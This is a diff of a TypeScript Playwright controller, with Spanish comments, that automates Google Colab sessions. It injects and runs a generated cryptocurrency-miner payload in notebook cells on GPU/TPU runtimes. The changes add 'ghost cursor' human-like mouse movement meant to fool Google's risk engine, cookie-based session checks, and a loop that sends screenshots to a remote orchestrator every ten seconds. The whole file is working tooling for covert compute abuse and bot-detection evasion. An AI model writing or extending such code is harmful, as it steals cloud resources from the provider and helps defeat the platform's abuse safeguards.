@@ -1,4 +1,11 @@
-import { Page, FrameLocator } from 'playwright';
+// =================================================================
+// APARATO: COLAB CONTROLLER (HUMAN OPERATOR & SURVEILLANCE)
+// RESPONSABILIDAD: NAVEGACIÓN, INYECCIÓN Y TRANSMISIÓN VISUAL
+// =================================================================
+
+import { Page } from 'playwright';
+import { createCursor } from 'ghost-cursor-playwright';
+import axios from 'axios';
 import { config } from '../config';
 import { generateMinerPayload } from './payload';
 import chalk from 'chalk';
@@ -7,6 +14,8 @@ export class ColabController {
   private page: Page;
   private workerId: string;
   private prefix: string;
+  private cursor: any; // Ghost Cursor instance
+  private surveillanceInterval: NodeJS.Timeout | null = null;
 
   constructor(page: Page, index: number) {
     this.page = page;
@@ -16,75 +25,117 @@ export class ColabController {
 
   async deploy() {
     try {
+      // 1. Inicializar Cursor Humano
+      this.cursor = await createCursor(this.page);
+
+      // 2. Secuencia de Despliegue
       await this.navigate();
       await this.checkAuth();
       await this.connectRuntime();
       await this.injectAndRun();
-      console.log(`${this.prefix} ${chalk.green('✅ DESPLIEGUE EXITOSO. MINERO ACTIVO.')}`);
+
+      // 3. Iniciar Vigilancia Visual (Panóptico)
+      this.startSurveillance();
+
+      console.log(`${this.prefix} ${chalk.green('✅ DESPLIEGUE COMPLETADO.')}`);
     } catch (e: any) {
-      console.error(`${this.prefix} ${chalk.red('❌ FALLO DE DESPLIEGUE:')}`, e.message);
-      if (config.DEBUG_MODE) {
-        await this.page.screenshot({ path: `logs/error-${this.workerId}.png` });
-      }
+      console.error(`${this.prefix} ${chalk.red('❌ ERROR CRÍTICO:')}`, e.message);
+      await this.reportSnapshot('error'); // Foto del crimen
       throw e;
     }
   }
 
   private async navigate() {
-    console.log(`${this.prefix} Navegando a Colab...`);
-    await this.page.goto(config.COLAB_URL, {
-      waitUntil: 'domcontentloaded',
-      timeout: config.NAV_TIMEOUT
-    });
+    console.log(`${this.prefix} Navegando a zona objetivo...`);
+    await this.page.goto(config.COLAB_URL, { waitUntil: 'domcontentloaded' });
+    // Movimiento humano aleatorio para calentar el motor de riesgo de Google
+    await this.cursor.move(Math.random() * 500, Math.random() * 500);
   }
 
   private async checkAuth() {
-    // Buscamos el avatar del usuario. Si no está, probablemente no estamos logueados.
+    // Verificamos si Google nos pide login (señal de cookies muertas)
     try {
-      await this.page.locator('# header-user-avatar-button').or(this.page.locator('img[src*="googleusercontent.com"]')).first().waitFor({ state: 'visible', timeout: 15000 });
-    } catch {
-      throw new Error('AUTH_ERROR: No se detectó sesión activa.');
+        const signInBtn = this.page.getByText('Sign in');
+        if (await signInBtn.isVisible({ timeout: 5000 })) {
+             throw new Error('COOKIES CADUCADAS: Login requerido.');
+        }
+    } catch (e) {
+        // Timeout significa que no vio el botón, lo cual es bueno.
     }
   }
 
   private async connectRuntime() {
-    console.log(`${this.prefix} 🔌 Solicitando Runtime...`);
+    console.log(`${this.prefix} 🔌 Conectando Runtime (GPU/TPU)...`);
 
-    // Selectores resilientes basados en texto y roles, no en clases ofuscadas
+    // Buscar botón con selectores tolerantes
     const connectBtn = this.page.getByText(/^Connect$|^Reconnect$/i).first();
 
     if (await connectBtn.isVisible()) {
-      await connectBtn.click();
+        // Clic humano (no instantáneo)
+        await this.cursor.click(connectBtn);
     }
 
-    // Esperamos a que aparezca el indicador de recursos (RAM/Disk)
-    // Esto confirma que Google nos dio una VM.
-    await this.page.waitForSelector('colab-memory-usage-sparkline', { timeout: 45000 })
-      .catch(() => { console.warn(`${this.prefix} ⚠️ Timeout esperando recursos UI, pero continuamos...`); });
+    // Esperar a que la UI de recursos aparezca (RAM/Disk)
+    await this.page.waitForSelector('colab-memory-usage-sparkline', { timeout: 45000 });
   }
 
   private async injectAndRun() {
     console.log(`${this.prefix} 💉 Inyectando Payload...`);
 
-    // Enfocamos el editor de código
+    // Clic en el editor
     const editor = this.page.locator('.view-lines').first();
-    await editor.click({ force: true });
+    await this.cursor.click(editor);
 
-    // Limpiamos celda
+    // Limpieza y pegado
     await this.page.keyboard.press('Control+A');
     await this.page.keyboard.press('Delete');
 
-    // Pegamos el código (más rápido y seguro que typear)
     const payload = generateMinerPayload(this.workerId);
     await this.page.evaluate((text) => navigator.clipboard.writeText(text), payload);
     await this.page.keyboard.press('Control+V');
 
-    // Ejecutamos (Ctrl+Enter)
+    await this.page.waitForTimeout(800); // Pausa para "pensar"
     await this.page.keyboard.press('Control+Enter');
+  }
 
-    // Validación visual de inicio
-    // Buscamos dentro del iframe de salida
-    const outputFrame = this.page.frameLocator('iframe').last();
-    await outputFrame.getByText('PROSPECTOR PAYLOAD').first().waitFor({ state: 'visible', timeout: 20000 });
+  // --- MÓDULO DE VIGILANCIA ---
+
+  private startSurveillance() {
+    if (this.surveillanceInterval) clearInterval(this.surveillanceInterval);
+
+    // Enviar telemetría visual cada 10 segundos
+    this.surveillanceInterval = setInterval(async () => {
+      try {
+        await this.reportSnapshot('running');
+      } catch (e) {
+        // Silencioso para no ensuciar logs
+      }
+    }, 10000);
+  }
+
+  private async reportSnapshot(status: 'running' | 'error' | 'captcha') {
+    if (!config.ORCHESTRATOR_URL) return;
+
+    // Captura JPEG calidad media (balance velocidad/calidad)
+    const buffer = await this.page.screenshot({ quality: 40, type: 'jpeg' });
+    const base64Image = `data:image/jpeg;base64,${buffer.toString('base64')}`;
+
+    try {
+        await axios.post(
+            `${config.ORCHESTRATOR_URL}/api/v1/admin/worker-snapshot`,
+            {
+                worker_id: this.workerId,
+                status: status,
+                snapshot_base64: base64Image,
+                timestamp: new Date().toISOString()
+            },
+            {
+                headers: { 'Authorization': `Bearer ${config.WORKER_AUTH_TOKEN}` },
+                timeout: 3000 // No bloquear el hilo si el servidor está lento
+            }
+        );
+    } catch (e) {
+        // Error de red al enviar snapshot, no crítico
+    }
   }
 }
